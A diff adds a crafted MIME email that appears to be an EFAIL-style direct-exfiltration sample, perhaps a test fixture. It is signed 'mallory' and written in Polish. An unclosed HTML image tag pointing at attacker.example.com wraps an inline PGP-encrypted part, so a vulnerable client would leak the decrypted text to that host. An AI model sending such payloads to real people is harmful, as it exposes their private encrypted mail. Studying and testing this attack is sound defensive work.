@@ -1,0 +1,31 @@
+From: mallory@attacker.example.com
+To: alicja@example.com
+Subject: Re: Raport finansowy Q1
+Date: Mon, 31 May 2026 11:00:00 +0200
+Content-Type: multipart/mixed; boundary="efail_boundary"
+MIME-Version: 1.0
+
+--efail_boundary
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Alicjo, sprawdz ponizszy dokument:</p>
+<img src="https://attacker.example.com/track?m=
+
+--efail_boundary
+Content-Type: application/octet-stream; name="raport.gpg"
+Content-Disposition: inline
+Content-Transfer-Encoding: base64
+
+jA0ECQMCqQ9iabZ+fMb/pJ3hmXcgStEpjMqZJctBmzd6Zja/Iwu0Ez6ddqkFjqjw
+bxhphtbNo6/oLqIyA9N0KNx34zA6ZelQ1QMYSTtC7BcNbU39sSgIDyVKBjTAwexf
+ildKt3ex8BZsLb3eB5cGlNcW1S/D1Bw+OAzNtVR10EeA6DxA5afNnXrIeJZRRnfH
+L6lfI0casDZBdM8QStXBLFek8sTl+C7gNxiLV+69
+
+--efail_boundary
+Content-Type: text/html; charset=utf-8
+
+" width="0" height="0">
+</body></html>
+
+--efail_boundary--
